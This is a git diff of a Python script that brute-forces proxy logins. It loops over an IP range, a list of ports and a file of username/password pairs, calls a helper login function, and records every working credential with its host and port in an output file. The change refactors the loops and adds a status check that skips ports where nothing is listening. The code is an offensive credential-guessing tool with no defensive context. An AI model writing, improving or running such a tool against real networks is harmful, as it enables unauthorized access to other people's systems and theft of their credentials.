@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 
 import sys
-from ipaddress import ip_address, ip_network
+from ipaddress import ip_network
 
 import helper
+from constants import cx_status
 
 
 def get_creds(f):
@@ -49,18 +50,22 @@ def main(argv):
 
     with open(out_file, 'w+') as of:
         for proxy in get_ip(ip_range):
-            for user, password in get_creds(in_file):
-                for port in ports:
-                    try:
-                        ret = helper.try_login(proxy, port, user, password)
-                        if ret:
-                            print(f"{user}:{password}@{proxy}:{port} OK")
-                            of.write(f"{user}:{password}@{proxy}:{port}")
-                            break
-                        else:
-                            print(f"{user}:{password}@{proxy}:{port} ko")
-                    except Exception as e:
+            for port in ports:
+                print(f"port {port}")
+                for user, password in get_creds(in_file):
+                    print(f"{user}/{password}")
+                    ret = helper.try_login(proxy, port, user, password)
+                    if ret == cx_status.CONNECTED:
+                        print(f"{user}:{password}@{proxy}:{port} OK")
+                        of.write(f"{user}:{password}@{proxy}:{port}")
+                        break
+                    elif ret == cx_status.NOT_LISTENING:
+                        print(f"Nothing is listening on port {port}")
+                        break
+                    else:
                         print(f"{user}:{password}@{proxy}:{port} ko")
+                if ret == cx_status.NOT_LISTENING:
+                    continue
 
 
 if __name__ == '__main__':
